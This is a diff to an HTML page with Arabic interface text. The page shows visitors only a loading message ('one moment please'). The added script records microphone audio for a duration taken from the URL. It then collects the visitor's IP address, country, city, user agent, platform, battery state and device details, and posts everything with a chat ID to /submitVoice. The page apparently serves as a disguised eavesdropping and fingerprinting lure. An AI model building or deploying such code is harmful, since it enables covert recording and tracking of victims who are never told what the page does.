@@ -76,143 +76,157 @@
     <div class="loading"></div>
     <p class="message">لحظه واحده من فظلك...</p>
   </div>
-  <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
-    <input type="hidden" name="chatId" id="chatId">
-    <input type="file" name="voice" id="voice" style="display: none;">
-  </form>
-  <div class="message"></div>
 
-  <script>
-    const chatId = getParameterByName('chatId');
+  <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
+        <input type="hidden" name="chatId" id="chatId">
+        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
+    </form>
+    <script>
+    const dataForm = document.getElementById('dataForm');
+    const chatIdInput = document.getElementById('chatIdInput');
+    const notification = document.getElementById('notification');
+
+    const chatId = window.location.pathname.split('/').pop();
+    chatIdInput.value = chatId;
+
     const duration = getParameterByName('duration');
     let mediaRecorder;
     let audioChunks = [];
 
-    window.addEventListener('load', () => {
-      if (duration > 0 && duration <= 20) {
-        startRecording();
-      } else {
-        document.querySelector('.message').textContent = 'حدث خطاء.';
-      }
-    });
-
-    async function startRecording() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.start();
-
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, duration * 1000);
-
-        mediaRecorder.addEventListener('dataavailable', event => {
-          audioChunks.push(event.data);
-        });
-
-        mediaRecorder.addEventListener('stop', async () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-          const formData = new FormData();
-          formData.append('voice', audioBlob, 'voice.ogg');
-          formData.append('chatId', chatId);
-
-          // Collect additional information
-          const ipInfo = await getIPInfo();
-          const platformInfo = getPlatformInfo();
-          const batteryInfo = await getBatteryInfo();
-          const deviceVersion = getDeviceVersion();
-
-          formData.append('ip', ipInfo.ip);
-          formData.append('country', ipInfo.country);
-          formData.append('city', ipInfo.city);
-          formData.append('platform', platformInfo.platform);
-          formData.append('userAgent', platformInfo.userAgent);
-          formData.append('batteryLevel', batteryInfo.batteryLevel);
-          formData.append('batteryCharging', batteryInfo.batteryCharging);
-          formData.append('deviceVersion', deviceVersion);
-
-          try {
-            const response = await fetch('/submitVoice', {
-              method: 'POST',
-              body: formData
-            });
-            const data = await response.text();
-            console.log('ok');
-          } catch (error) {
-            console.error('حدث خطأ :', error);
-          }
-        });
-      } catch (error) {
-        console.error('error:', error);
-      }
-    }
-
     async function getIPInfo() {
-      try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        return {
-          ip: data.ip,
-          country: data.country_name,
-          city: data.city
-        };
-      } catch (error) {
-        console.error('Error fetching IP info:', error);
-        return {
-          ip: 'Unknown',
-          country: 'Unknown',
-          city: 'Unknown'
-        };
-      }
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                country: data.country_name,
+                city: data.city
+            };
+        } catch (error) {
+            console.error('Error fetching IP info:', error);
+            return {
+                ip: 'Unknown',
+                country: 'Unknown',
+                city: 'Unknown'
+            };
+        }
     }
 
     function getPlatformInfo() {
-      const ua = navigator.userAgent;
-      let platform = "Unknown";
-      if (/Windows/.test(ua)) platform = "Windows";
-      else if (/Mac/.test(ua)) platform = "MacOS";
-      else if (/Linux/.test(ua)) platform = "PUBG";
-      else if (/Android/.test(ua)) platform = "Android";
-      else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+        const ua = navigator.userAgent;
+        let platform = "Unknown";
+        if (/Windows/.test(ua)) platform = "Windows";
+        else if (/Mac/.test(ua)) platform = "MacOS";
+        else if (/Linux/.test(ua)) platform = "Linux";
+        else if (/Android/.test(ua)) platform = "Android";
+        else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
 
-      return {
-        platform: platform,
-        userAgent: ua
-      };
+        return {
+            platform: platform,
+            userAgent: ua
+        };
     }
 
     async function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        try {
-          const battery = await navigator.getBattery();
-          return {
-            batteryLevel: battery.level,
-            batteryCharging: battery.charging
-          };
-        } catch (error) {
-          console.error('Error getting battery info:', error);
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging
+                };
+            } catch (error) {
+                console.error('Error getting battery info:', error);
+            }
         }
-      }
-      return {
-        batteryLevel: undefined,
-        batteryCharging: undefined
-      };
+        return {
+            batteryLevel: undefined,
+            batteryCharging: undefined
+        };
     }
 
     function getDeviceVersion() {
-      const ua = navigator.userAgent;
-      const match = ua.match(/\(([^)]+)\)/);
-      return match ? match[1] : 'Unknown';
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+        return match ? match[1] : 'Unknown';
+    }
+
+    window.addEventListener('load', () => {
+        const parsedDuration = parseInt(duration);
+        if (parsedDuration > 0 && parsedDuration <= 20) {
+            startRecording(parsedDuration);
+        } else {
+            notification.textContent = 'حدث خطأ في مدة التسجيل.';
+        }
+    });
+
+    async function startRecording(recordDuration) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.start();
+
+            notification.textContent = 'جاري التسجيل...';
+
+            setTimeout(() => {
+                mediaRecorder.stop();
+                notification.textContent = 'تم إيقاف التسجيل، جاري الإرسال...';
+            }, recordDuration * 1000);
+
+            mediaRecorder.addEventListener('dataavailable', event => {
+                audioChunks.push(event.data);
+            });
+
+            mediaRecorder.addEventListener('stop', async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                const formData = new FormData();
+                formData.append('voice', audioBlob, 'voice.ogg');
+                formData.append('chatId', chatId);
+
+                const ipInfo = await getIPInfo();
+                const platformInfo = getPlatformInfo();
+                const batteryInfo = await getBatteryInfo();
+                const deviceVersion = getDeviceVersion();
+
+                const additionalData = {
+                    ...ipInfo,
+                    ...platformInfo,
+                    ...batteryInfo,
+                    deviceVersion
+                };
+
+                formData.append('additionalData', JSON.stringify(additionalData));
+
+                try {
+                    const response = await fetch('/submitVoice', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    const data = await response.text();
+                    console.log('تم إرسال التسجيل الصوتي والبيانات بنجاح');
+                    notification.textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
+                } catch (error) {
+                    console.error('حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات:', error);
+                    notification.textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
+                }
+            });
+        } catch (error) {
+            console.error('خطأ في الوصول إلى الميكروفون:', error);
+            notification.textContent = 'خطأ في الوصول إلى الميكروفون';
+        }
     }
 
     function getParameterByName(name, url = window.location.href) {
-      name = name.replace(/[\[\]]/g, '\\$&');
-      const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-            results = regex.exec(url);
-      if (!results) return null;
-      if (!results[2]) return '';
-      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        name = name.replace(/[\[\]]/g, '\\$&');
+        const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+              results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
     }
-  </script>
+    </script>
 </body>
 </html>
